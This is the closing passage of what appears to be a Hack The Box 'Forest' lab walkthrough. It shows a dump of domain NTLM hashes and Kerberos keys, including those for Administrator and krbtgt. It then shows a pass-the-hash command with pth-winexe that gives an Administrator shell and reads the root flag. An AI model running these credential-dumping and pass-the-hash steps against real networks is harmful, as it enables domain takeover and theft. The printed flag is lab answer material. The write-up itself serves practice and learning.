+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+drroot:9602:aad3b435b51404eeaad3b435b51404ee:b32343b7f79d8a501b4f7a8cf932e795:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:cb0bb29d3519a34dc4fc87ac5005826a:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Kerberos keys grabbed
+htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
+htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
+htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
+htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
+htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
+htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
+htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
+drroot:aes256-cts-hmac-sha1-96:651f705804ba300e48ac1f1a87a0f74b84a7ddc2ddeeda290a82c383e8827fb5
+drroot:aes128-cts-hmac-sha1-96:32c7a3b3eb7c2032cd0521fa79c95fd3
+drroot:des-cbc-md5:45e53b3ef210f119
+FOREST$:aes256-cts-hmac-sha1-96:a8af4af6de1a072fb3609ffd7fd8dd98a2a557d8770d6bb94d29cb73491628fc
+FOREST$:aes128-cts-hmac-sha1-96:34ec5321ee3173f3ce0086e07028a53f
+FOREST$:des-cbc-md5:fef26767dffec410
+EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
+EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+EXCH01$:des-cbc-md5:8c45f44c16975129
+[*] Cleaning up... 
+                                                                                                    </code></pre><h3 id="198d1b9f-8847-8038-a8e5-c480be932dba" class="">Pass The Hash</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="198d1b9f-8847-807c-a713-e72294a23c6b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">                                                                                                   
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Forest]
+└─$ pth-winexe -U htb.local/administrator%aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6  //10.10.10.161 cmd.exe
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+htb\administrator
+
+C:\Windows\system32&gt;cd ../../Users/Administrator/Desktop
+cd ../../Users/Administrator/Desktop
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+baed60dba7bc114294900bce77f53492
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
